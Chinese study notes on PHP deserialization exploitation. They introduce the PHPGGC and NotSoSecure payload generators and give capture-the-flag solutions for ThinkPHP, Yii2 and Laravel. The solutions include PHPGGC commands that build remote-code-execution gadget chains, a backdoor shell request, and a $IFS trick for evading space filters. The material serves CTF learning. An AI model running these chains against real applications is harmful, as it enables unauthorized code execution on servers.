
---
➢ 反序列化链项目-PHPGGC&NotSoSecure

➢ 反序列化框架利用-ThinkPHP&Yii&Laravel

#反序列化链项目-PHPGGC&NotSoSecure

-NotSoSecure

https://github.com/NotSoSecure/SerializedPayloadGenerator

为了利用反序列化漏洞，需要设置不同的工具，如 YSoSerial(Java)、YSoSerial.NET、PHPGGC 和它的先决条件。DeserializationHelper 是包含对 YSoSerial(Java)、YSoSerial.Net、PHPGGC 和其他工具的支持的Web界面。使用Web界面，您可以为各种框架生成反序列化payload.

*Java – YSoSerial*

*NET – YSoSerial.NET*

*PHP – PHPGGC*

*Python - 原生*

-PHPGGC  php框架反序列化工具

https://github.com/ambionics/phpggc

PHPGGC是一个包含unserialize()有效载荷的库以及一个从命令行或以编程方式生成它们的工具。当在您没有代码的网站上遇到反序列化时，或者只是在尝试构建漏洞时，此工具允许您生成有效负载，而无需执行查找小工具并将它们组合的繁琐步骤。 它可以看作是frohoff的ysoserial的等价物，但是对于PHP。目前该工具支持的小工具链包括：CodeIgniter4、Doctrine、Drupal7、Guzzle、Laravel、Magento、Monolog、Phalcon、Podio、ThinkPHP、Slim、SwiftMailer、Symfony、Wordpress、Yii和ZendFramework等。


#反序列化框架利用-ThinkPHP-Yii-Laravel

[安洵杯 2019]iamthinking Thinkphp V6.0.X 反序列化

```
./phpggc ThinkPHP/RCE4 system 'cat /flag' --url
```

CTFSHOW 反序列化 267 Yii2反序列化

弱口令登录/源码提示泄漏

```
GET：index.php?r=site%2Fabout&view-source

GET：/index.php?r=backdoor/shell&code=

./phpggc Yii2/RCE1 exec 'cp /fla* tt.txt' --base64
```

CTFSHOW 反序列化 271 Laravel反序列化

```
./phpggc Laravel/RCE2 system "tac$IFSfla*" --url

$IFS代替空格
```

#Thinkphp 反序列化链分析

Thinkphp-All-vuln-main